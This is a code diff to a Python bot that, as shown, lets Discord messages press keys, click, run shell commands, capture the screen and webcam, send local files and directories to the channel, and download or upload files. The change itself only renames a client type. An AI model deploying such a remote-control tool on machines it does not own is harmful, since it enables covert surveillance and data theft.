@@ -76,19 +76,19 @@ editor_filename = ""
 file_content = ""
 
 
-async def press(client: discord.Client, message: discord.Message, args: str):
+async def press(client: RemoteClient, message: discord.Message, args: str):
     keys = args.split(" ")
     for a in keys:
         pyautogui.press(a)
     await message.reply(f"Pressed {', '.join(keys)}")
 
 
-async def typewrite(client: discord.Client, message: discord.Message, args: str):
+async def typewrite(client: RemoteClient, message: discord.Message, args: str):
     pyautogui.typewrite(args)
     await message.reply(f"Typed {args}")
 
 
-async def hotkey(client: discord.Client, message: discord.Message, args: str):
+async def hotkey(client: RemoteClient, message: discord.Message, args: str):
     keys = args.split(" ")
     for a in keys:
         pyautogui.keyDown(a)
@@ -97,7 +97,7 @@ async def hotkey(client: discord.Client, message: discord.Message, args: str):
     await message.reply(f"Send hotkey with commands {', '.join(keys)}")
 
 
-async def specialKeys(client: discord.Client, message: discord.Message, args: str):
+async def specialKeys(client: RemoteClient, message: discord.Message, args: str):
     await message.reply("\n".join(pyautogui.KEY_NAMES))
 
 async def cam(client:discord.Client, message:discord.Message, args:str):
@@ -110,7 +110,7 @@ async def cam(client:discord.Client, message:discord.Message, args:str):
         temp.close()
         os.unlink(temp.name)
 
-async def loc(client: discord.Client, message: discord.Message, args: str):
+async def loc(client: RemoteClient, message: discord.Message, args: str):
     if len(message.attachments) == 0:
         return await message.reply("No file specified")
     fileUrl = message.attachments[0].url
@@ -131,13 +131,13 @@ async def loc(client: discord.Client, message: discord.Message, args: str):
     os.remove(message.attachments[0].filename)
 
 
-async def click(client: discord.Client, message: discord.Message, args: str):
+async def click(client: RemoteClient, message: discord.Message, args: str):
     pos = args.split(" ")
     pyautogui.click(int(pos[0]), int(pos[1]))
     await message.reply("Clicked at " + str(pos))
 
 
-async def play(client: discord.Client, message: discord.Message, args: str):
+async def play(client: RemoteClient, message: discord.Message, args: str):
     """
     It plays the sound file that was attached to the message
 
@@ -185,7 +185,7 @@ def exec_command(command):
     return (exec.stdout, exec.stderr)
 
 
-async def dump(client: discord.Client, message: discord.Message, args: str):
+async def dump(client: RemoteClient, message: discord.Message, args: str):
     """
     It takes a file or directory, and sends it to the channel.
 
@@ -209,7 +209,7 @@ async def dump(client: discord.Client, message: discord.Message, args: str):
         await message.channel.send(file=discord.File(fp))
 
 
-async def screenshot(client: discord.Client, message: discord.Message, args: str):
+async def screenshot(client: RemoteClient, message: discord.Message, args: str):
 
     """
     It takes a screenshot of the entire screen, saves it to a file, and sends it to the channel the
@@ -229,7 +229,7 @@ async def screenshot(client: discord.Client, message: discord.Message, args: str
     await message.channel.send(file=discord.File(byteio, "screenshot.png"))
 
 
-async def cd(client: discord.Client, message: discord.Message, args: str):
+async def cd(client: RemoteClient, message: discord.Message, args: str):
     """
     It changes the directory to the one specified in the arguments.
 
@@ -245,7 +245,7 @@ async def cd(client: discord.Client, message: discord.Message, args: str):
     await message.channel.send("Changed directory to " + args)
 
 
-async def upload(client: discord.Client, message: discord.Message, args: str):
+async def upload(client: RemoteClient, message: discord.Message, args: str):
     """
     It downloads the file from the URL, and saves it to the specified location.
 
@@ -268,7 +268,7 @@ async def upload(client: discord.Client, message: discord.Message, args: str):
         await session.close()
 
 
-async def download(client: discord.Client, message: discord.Message, args: str):
+async def download(client: RemoteClient, message: discord.Message, args: str):
 
     """
     It downloads a file from a URL and saves it to a file.
@@ -294,7 +294,7 @@ async def download(client: discord.Client, message: discord.Message, args: str):
         await session.close()
 
 
-async def edit(client: discord.Client, message: discord.Message, args: str):
+async def edit(client: RemoteClient, message: discord.Message, args: str):
     """
     It sends a message, sends a file, sends another message, waits for a message, writes the message
     content to the file, sends another message.
@@ -325,7 +325,7 @@ async def edit(client: discord.Client, message: discord.Message, args: str):
         await message.channel.send("Too much time has passed :C")
 
 
-async def pwd(client: discord.Client, message: discord.Message, args: str):
+async def pwd(client: RemoteClient, message: discord.Message, args: str):
 
     """
     It sends a message to the channel the command was sent in, saying the current directory
@@ -340,7 +340,7 @@ async def pwd(client: discord.Client, message: discord.Message, args: str):
     await message.channel.send("Current directory is " + os.getcwd())
 
 
-async def browser(client: discord.Client, message: discord.Message, args: str):
+async def browser(client: RemoteClient, message: discord.Message, args: str):
     """
     It opens a web browser and goes to the URL specified in the command.
 
